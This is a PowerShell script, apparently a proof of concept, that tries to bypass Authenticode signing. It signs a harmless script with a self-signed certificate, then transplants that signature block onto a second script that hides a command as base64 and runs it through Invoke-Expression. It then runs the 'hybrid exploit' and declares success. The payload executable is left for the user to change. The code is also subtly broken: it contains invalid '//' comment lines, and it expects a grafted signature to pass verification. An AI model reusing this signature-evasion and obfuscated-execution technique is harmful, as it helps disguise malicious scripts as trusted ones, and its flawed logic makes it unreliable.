# Create a working directory
New-Item -ItemType Directory -Path "C:\Temp" -Force
Set-Location "C:\Temp"

# Step 1: Create a legitimate script
$legitimateScript = @"
Write-Host "This is a test script"
function Get-SystemInfo {
    Get-ComputerInfo
}
"@
# Save the script
$legitimateScript | Out-File -FilePath "C:\Temp\legitimate.ps1" -Encoding UTF8

# Step 2: Create a code signing certificate
# Check if certificate already exists to avoid errors on re-run
$cert = Get-ChildItem -Path "cert:\CurrentUser\My" | Where-Object { $_.FriendlyName -eq "Test Code Signing Cert" }
if (-not $cert) {
    $cert = New-SelfSignedCertificate -DnsName "TestCert" -CertStoreLocation "cert:\CurrentUser\My" -KeySpec "Signature" -KeyUsage DigitalSignature -FriendlyName "Test Code Signing Cert" -Type CodeSigningCert
}

# Step 3: Sign the legitimate script
Set-AuthenticodeSignature -FilePath "C:\Temp\legitimate.ps1" -Certificate $cert -Force

# ===================================================================
// MODIFICATION STARTS HERE
// ===================================================================

# Step 4: Define the path to the executable you want to run
# --- CHANGE THIS LINE ---
$executableToRun = "C:\Windows\System32\notepad.exe" 

# Step 5: Create the malicious script dynamically
# The base64 string will now be created from your specified executable path
$commandToExecute = "Invoke-Expression '$executableToRun'"
$bytesToEncode = [System.Text.Encoding]::UTF8.GetBytes($commandToExecute)
$base64Payload = [System.Convert]::ToBase64String($bytesToEncode)

$maliciousScript = @"
# This part of the script will be used for signature verification
Write-Host "This appears to be a legitimate script"
function Test-Function {
    param([string]`$param1)
    Write-Host "Parameter: `$param1"
}

# This part contains the malicious payload that will be executed
# The base64 string decodes to your custom command
`$maliciousCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64Payload"))
Invoke-Expression `$maliciousCommand
"@

# Save the malicious script with UTF8 encoding
$maliciousScript | Out-File -FilePath "C:\Temp\malicious.ps1" -Encoding UTF8

# ===================================================================
// MODIFICATION ENDS HERE
// ===================================================================

# Step 6: Create the hybrid exploit by combining malicious content with a valid signature
# Read the binary content of both files
$legitimateBytes = [System.IO.File]::ReadAllBytes("C:\Temp\legitimate.ps1")
$maliciousBytes = [System.IO.File]::ReadAllBytes("C:\Temp\malicious.ps1")

# Find the signature block in the legitimate file
$signaturePattern = [System.Text.Encoding]::UTF8.GetBytes("# SIG # Begin signature block")
$signatureStart = -1
for ($i = 0; $i -lt $legitimateBytes.Length - $signaturePattern.Length; $i++) {
    $match = $true
    for ($j = 0; $j -lt $signaturePattern.Length; $j++) {
        if ($legitimateBytes[$i + $j] -ne $signaturePattern[$j]) {
            $match = $false
            break
        }
    }
    if ($match) {
        $signatureStart = $i
        break
    }
}

if ($signatureStart -ne -1) {
    # Extract the signature block
    $signatureBlock = $legitimateBytes[$signatureStart..($legitimateBytes.Length-1)]
    
    # Create a new file that combines the malicious content with the legitimate signature
    $hybridBytes = $maliciousBytes + $signatureBlock
    
    # Write the hybrid file
    [System.IO.File]::WriteAllBytes("C:\Temp\hybrid.ps1", $hybridBytes)
    Write-Host "Hybrid exploit file created at C:\Temp\hybrid.ps1"
    
    # Step 7: Verify the signature status
    Write-Host "Signature status:"
    Get-AuthenticodeSignature "C:\Temp\hybrid.ps1" | Format-List Status, StatusMessage
    
    # Step 8: Execute the hybrid script
    Write-Host "Attempting to execute the hybrid script..."
    try {
        & "C:\Temp\hybrid.ps1"
    }
    catch {
        Write-Host "Error executing script: $_"
    }
    
    # Step 9: Check if the target executable was opened
    # Get the process name from the executable path
    $processName = [System.IO.Path]::GetFileNameWithoutExtension($executableToRun)
    $targetProcess = Get-Process | Where-Object { $_.ProcessName -eq $processName }
    
    if ($targetProcess) {
        Write-Host "Exploit successful! '$processName' process is running with PID: $($targetProcess.Id)"
    }
    else {
        Write-Host "Target process '$processName' not found. The exploit may not have worked."
    }
}
else {
    Write-Host "Could not find signature block in legitimate file"
}